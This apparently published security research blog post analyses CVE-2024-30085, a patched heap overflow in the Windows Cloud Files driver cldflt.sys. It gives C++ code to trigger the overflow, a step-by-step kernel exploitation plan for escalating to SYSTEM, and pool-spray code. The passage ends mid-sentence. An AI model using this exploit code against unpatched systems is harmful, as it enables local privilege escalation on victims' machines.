["https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit"]
title = "All I Want for Christmas is a CVE-2024-30085 Exploit | STAR Labs"
description = "TLDR CVE-2024-30085 is a heap-based buffer overflow vulnerability affecting the Windows Cloud Files Mini Filter Driver cldflt.sys. By crafting a custom reparse point, it is possible to trigger the buffer overflow to corrupt an adjacent _WNF_STATE_DATA object. The corrupted _WNF_STATE_DATA object can be used to leak a kernel pointer from an ALPC handle table object. A second buffer overflow is then used to corrupt another _WNF_STATE_DATA object, which is then used to corrupt an adjacent PipeAttribute object."
full_description = 'Home » Blogs All I Want for Christmas is a CVE-2024-30085 Exploit December 24, 2024 · 21 min · Cherie-Anne Lee Table of Contents TLDR Table of Contents Introduction to cldflt.sys Vulnerability Analysis and Patch Reparse Point Structure Triggering the Vulnerability Exploitation Overview Obtaining a Kernel Pointer Leak Arbitrary Read Privilege Escalation Exploit Demo Acknowledgements References TLDR# CVE-2024-30085 is a heap-based buffer overflow vulnerability affecting the Windows Cloud Files Mini Filter Driver cldflt.sys. By crafting a custom reparse point, it is possible to trigger the buffer overflow to corrupt an adjacent _WNF_STATE_DATA object. The corrupted _WNF_STATE_DATA object can be used to leak a kernel pointer from an ALPC handle table object. A second buffer overflow is then used to corrupt another _WNF_STATE_DATA object, which is then used to corrupt an adjacent PipeAttribute object. By forging a PipeAttribute object in userspace, we are able to leak the token address and override privileges to escalate privileges to NT AUTHORITY\SYSTEM. Table of Contents# Introduction to cldflt.sys Vulnerability Analysis and Patch Reparse Point Structure Triggering the Vulnerability Exploitation Overview Obtaining a Kernel Pointer Leak Arbitrary Read Privilege Escalation Exploit Demo Acknowledgements References Introduction to cldflt.sys# cldflt.sys is the Windows Cloud Files Mini Filter Driver, which allows users to manage and sync files between a remote server and a local client. cldflt.sys works by creating placeholder files and directories, which are implemented as reparse points. Placeholders allow the actual contents of a file to reside somewhere else and be retrieved (known as “hydration”) on demand, while looking and behaving like a normal file on the system. Placeholders can be created and managed by users via the Cloud Files API. Vulnerability Analysis and Patch# CVE-2024-30085 is a heap-based buffer overflow vulnerability discovered by Alex Birnberg from SSD Secure Disclosure, as well as Gwangun Jung and Junoh Lee from Theori. For Windows 10 22H2, this vulnerability was fixed in the KB5039211 update. Looking at the patch diff, it is clear that the HsmIBitmapNORMALOpen function has been modified. The vulnerable driver binary is displayed on the left, and the patched driver binary is on the right. From here, we can see that an additional code block cmp r14d, 0x1000 has been added. Taking a look at part of the decompilation of the unpatched function: if (local_70 == 0x0) || (0xffe < memcpy_size - 1) { Dst = ExAllocatePoolWithTag(1, 0x1000, 0x6d427348); if (Dst == 0x0) { HsmDbgBreakOnStatus(-0x3fffff66); ... // Go to error path } memcpy(Dst, local_70, memcpy_size); } else { iVar13 = *(int *)((memcpy_size - 4) + (longlong)local_70); if (iVar13 == -1) && (memcpy_size == 4) { *(uint *)(Dst + 2) = *(uint *)(Dst + 2) | 0x10; } else { Dst = ExAllocatePoolWithTag(1, 0x1000, 0x6d427348); // Allocate a HsBm object if (Dst == 0x0) { HsmDbgBreakOnStatus(-0x3fffff66); ... // Go to error path } } memcpy(Dst, local_70, memcpy_size); // Vulnerable memcpy, we control local_70 and memcpy_size! ... } The driver allocates a HsBm object of size 0x1000 in the paged pool, and copies data of memcpy_size to the allocated buffer. As the user is able to control the data copied, as well as the value of memcpy_size, if memcpy_size is greater than 0x1000, a heap-based buffer overflow in the paged pool will occur! if (((int)uVar7 != 0) && (0x1000 < memcpy_size)) { HsmDbgBreakOnStatus(-0x3fff30fe); ... // Go to error path } To patch the vulnerability, a check to determine if memcpy_size is less than or equal to 0x1000 was added, and the memcpy would only be called if this check passes. Reparse Point Structure# However, in order to understand how to trigger this vulnerability, we must first understand the structure of the reparse points that the cldflt driver uses to store data. A reparse point comprises of a reparse tag, which identifies the file system driver that owns the reparse point, and user-defined data. In this case, when we create the file used for exploitation, we will use IO_REPARSE_TAG_CLOUD_6 (0x9000601a) as the reparse tag. The user-defined data has the following structure: typedef struct _REPARSE_DATA_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; struct { UCHAR DataBuffer[1]; } GenericReparseBuffer; } REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER; DataBuffer has a variable size, and contains custom data set by the cloud filter driver, which takes the following format: struct _HSM_REPARSE_DATA { USHORT Flags; USHORT Length; HSM_DATA FileData; } HSM_REPARSE_DATA, *PHSM_REPARSE_DATA; When cldflt.sys creates a reparse point, if the size of the data is greater than 0x100 bytes, it will compress the data using RtlCompressBuffer with COMPRESSION_FORMAT_LZNT1. Flags is set to 0x1 if no compression is involved, and 0x8001 if compression is used. Length refers to the size of the entire _HSM_REPARSE_DATA structure. FileData takes the following form: typedef struct _HSM_DATA { ULONG Magic; ULONG Crc32; ULONG Length; USHORT Flags; USHORT NumberOfElements; HSM_ELEMENT_INFO ElementInfos[1]; } HSM_DATA, *PHSM_DATA; Magic is set to 0x70527442 (“BtRp”) for bitmap data, and 0x70526546 (“FeRp”) for file data. If the CRC32 exists, it will be included in the structure. The CRC32 is calculated using RtlComputeCrc32. Length refers to the size of the entire _HSM_DATA object. Flags will be set to 0x2 if a CRC32 checksum value exists. A _HSM_DATA struct can include a number of elements, which take the following form: typedef struct _HSM_ELEMENT_INFO { USHORT Type; USHORT Length; ULONG Offset; } HSM_ELEMENT_INFO, *PHSM_ELEMENT_INFO; Elements can have the following types: #define HSM_ELEMENT_TYPE_NONE 0x00 #define HSM_ELEMENT_TYPE_UINT64 0x06 #define HSM_ELEMENT_TYPE_BYTE 0x07 #define HSM_ELEMENT_TYPE_UINT32 0x0a #define HSM_ELEMENT_TYPE_BITMAP 0x11 #define HSM_ELEMENT_TYPE_MAX 0x12 Length refers to the size of the element data, and offset is relative to the start of the _HSM_DATA struct. Triggering the Vulnerability# Let’s take a look at the code path required to trigger the vulnerability: -> HsmFltPostCREATE -> HsmiFltPostECPCREATE -> HsmpSetupContexts -> HsmpCtxCreateStreamContext -> HsmIBitmapNORMALOpen By opening a file containing cldflt reparse data, we are able to reach HsmpCtxCreateStreamContext. However, in order to reach HsmIBitmapNORMALOpen to trigger the vulnerable memcpy, there are certain checks that we have to pass relating to both the FeRp object as well as its nested BtRp object. When HsmpCtxCreateStreamContext is reached, it will call HsmpRpValidateBuffer, which will perform checks on the reparse data. It first checks the length and magic of the _HSM_DATA object, before computing its CRC32. The number of elements is then checked to ensure that it is less than 0xa, which is the maximum number of elements for an FeRp object. Once initial checks have passed, the function loops over all the elements to ensure that the sum of the element offset and length does not exceed the length of the data object. After that is complete, checks are performed on each of the elements, and usually comprise of the following: Check that the element type is within the range of allowed types (i.e. less than HSM_ELEMENT_TYPE_MAX, which is 0x12) Check the element offset Check the element size In this case, the elements of an FeRp object must fulfil the following criteria: Element 0 must be of type BYTE (0x07) Element 1 must be of type UINT32 (0x0a) Element 2 must be of type UINT64 (0x06) Element 4 must be of type BITMAP (0x11) HsmpBitmapIsReparseBufferSupported is then called to perform checks on the nested BtRp object. Initial checks similar to those for the FeRp object are performed, sans the CRC32 calculation. The maximum number of elements allowed for a BtRp object is 0x5. The elements must fulfil the following criteria: Element 0 must be of type BYTE (0x07) Element 1 must be of type BYTE (0x07) Element 2 must be of type BYTE (0x07) Once HsmpBitmapIsReparseBufferSupported is done, it returns back to HsmpRpValidateBuffer, which returns to HsmpCtxCreateStreamContext, which finally calls HsmIBitmapNORMALOpen. HsmIBitmapNORMALOpen also implements checks on the elements of the BtRp object: Element 1 must be of type BYTE (0x07), and must have a value of 0x1 Element 2 must be of type BYTE (0x07) Element 3 must be of type UINT64 (0x06) Element 4 must be of type BITMAP (0x11) Once all these conditions are fulfilled, we will finally reach the vulnerable memcpy! In order to trigger the vulnerability, we will first have to use the Cloud Filter API to register a sync root: CF_SYNC_REGISTRATION CfSyncRegistration = { 0 }; CfSyncRegistration.StructSize = sizeof(CF_SYNC_REGISTRATION); CfSyncRegistration.ProviderName = L"FFE4"; CfSyncRegistration.ProviderVersion = L"1.0"; CfSyncRegistration.ProviderId = { 0xf4d808a4, 0xa493, 0x4703, { 0xa8, 0xb8, 0xe2, 0x6a, 0x7, 0x7a, 0xd7, 0x3b } }; CF_SYNC_POLICIES CfSyncPolicies = { 0 }; CfSyncPolicies.StructSize = sizeof(CF_SYNC_POLICIES); CfSyncPolicies.HardLink = CF_HARDLINK_POLICY_ALLOWED; CfSyncPolicies.Hydration.Primary = CF_HYDRATION_POLICY_FULL; CfSyncPolicies.InSync = CF_INSYNC_POLICY_NONE; CfSyncPolicies.Population.Primary = CF_POPULATION_POLICY_PARTIAL; CfSyncPolicies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_UPDATE_UNRESTRICTED; hRet = CfRegisterSyncRoot(SyncRoot, &CfSyncRegistration, &CfSyncPolicies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT); if (!SUCCEEDED(hRet)) { CfUnregisterSyncRoot(SyncRoot); cout << "CfRegisterSyncRoot failed! error=" << GetLastError() << endl; return -1; } printf("[+] CfRegisterSyncRoot success: 0x%lx\n", hRet); We will then create our file in the sync root directory: HANDLE hFile1; CString FullFileName1 = L"c:\\windows\\temp\\test"; hFile1 = CreateFile(FullFileName1, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile1 == INVALID_HANDLE_VALUE) { cout << "Open file failed! error=" << GetLastError() << endl; return -1; } printf("[+] Created exploit file 1: %d\n", hFile1); Finally, we will set the reparse point data using FSCTL_SET_REPARSE_POINT_EX. hBool = DeviceIoControl(hFile, FSCTL_SET_REPARSE_POINT_EX, &RpBufEx, (0x28+CompressedRpBufSize), NULL, 0, NULL, NULL); if (hBool == 0) { cout << "FSCTL_SET_REPARSE_POINT_EX failed! error=" << GetLastError() << endl; return -1; } printf("[+] FSCTL_SET_REPARSE_POINT_EX succeeded\n"); To hit the vulnerable code path, all we need to do is to reopen the file: printf("[+] Opening file 1 to trigger vulnerability\n"); hFile1 = 0; hFile1 = CreateFile(FullFileName1, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile1 == INVALID_HANDLE_VALUE) { cout << "Open file failed! error=" << GetLastError() << endl; return -1; } printf("[+] File 1 handle: %d\n", hFile1); Once the overflow occurs, the machine crashes! Exploitation Overview# Currently, we have an overflow in the paged pool, affecting an object of size 0x1000. In order to escalate privileges, we are going to require a kernel pointer leak, and the ability to do an arbitrary write. It is also possible to trigger this vulnerability multiple times, provided that we control the memory layout so that the machine does not crash. Hence, we are going to trigger this bug twice – once to obtain a kernel leak and gain an arbitrary write primitive, and a second time to gain arbitrary read which would give us the address of token. Here is the exploit plan: Create exploit file 1 and set custom reparse point data of size 0x1010 Spray a padding _WNF_STATE_DATA spray Spray the first set of _WNF_STATE_DATA objects Poke holes by freeing every alternate _WNF_STATE_DATA object Trigger the vulnerability for the first time to reclaim one of the holes – this corrupts the _WNF_STATE_DATA object, giving us out-of-bounds read and write Spray ALPC handle tables to reclaim the rest of the holes Leak a kernel pointer via reading from the first corrupted _WNF_STATE_DATA object Create exploit file 2 and set custom reparse point data of size 0x1010 Spray second padding _WNF_STATE_DATA spray Poke holes by freeing every alternate _WNF_STATE_DATA object Trigger the vulnerability for the second time to reclaim one of the holes Spray PipeAttribute to reclaim the rest of the holes Use the second corrupted _WNF_STATE_DATA object to corrupt the PipeAttribute object to point to a fake object in userland – this gives us arbitrary read Use the corrupted PipeAttribute object to obtain the address of token Use the first corrupted _WNF_STATE_DATA object to corrupt the ALPC handle table to give us arbitrary write Overwrite token privileges get full privileges! Obtain a handle to the winlogon process Pop an NT AUTHORITY\SYSTEM shell!!! Obtaining a Kernel Pointer Leak# We will be obtaining a kernel pointer leak using two kernel objects: _WNF_STATE_DATA and _ALPC_HANDLE_TABLE. Let’s first take a look at _WNF_STATE_DATA: struct _WNF_STATE_DATA { struct _WNF_NODE_HEADER Header; //0x0 ULONG AllocatedSize; //0x4 ULONG DataSize; //0x8 ULONG ChangeStamp; //0xc }; The Windows Notification Facility (WNF) is a undocumented kernel component used to send notifications across the system. The data used for sending notifications is stored in the _WNF_STATE_DATA object, which is allocated in the paged pool and comprises of a header of size 0x10, followed by the data right after. The maximum DataSize allowed is 0x1000, but that does not cause issues for us since we are working with objects of size 0x1000 (using a DataSize of 0xff0 would mean that the allocated WNF object has a size of 0x1000). To prepare the _WNF_STATE_DATA spray, we can do the following: #define NUM_WNFSTATEDATA 0x450 #define WNF_MAXBUFSIZE 0x1000 PWNF_STATE_NAME_REGISTRATION PStateNameInfo = NULL; WNF_STATE_NAME StateNames[NUM_WNFSTATEDATA] = { 0 }; PSECURITY_DESCRIPTOR pSD = nullptr; NTSTATUS state = 0; char StateData[0x1000]; printf("[+] Prepare _WNF_STATE_DATA spray\n"); memset(StateData, 0x41, sizeof(StateData)); if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"", SDDL_REVISION_1, &pSD, nullptr)) { cout << "ConvertStringSecurityDescriptorToSecurityDescriptor failed! error=" << GetLastError() << endl; return -1; } for (int i = 0; i < NUM_WNFSTATEDATA; i++) { state = NtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, WNF_MAXBUFSIZE, pSD); if (state != 0) { cout << "NtCreateWnfStateName failed! error=" << GetLastError() << endl; return -1; } } We will spray our first _WNF_STATE_DATA spray: printf("[+] Spraying _WNF_STATE_DATA\n"); for (int i = 0; i < NUM_WNFSTATEDATA; i++) { state = NtUpdateWnfStateData(&StateNames[i], StateData, (0x1000-0x10), 0, 0, 0, 0); if (state != 0) { cout << "NtUpdateWnfStateData failed! error=" << GetLastError() << endl; return -1; } } T'
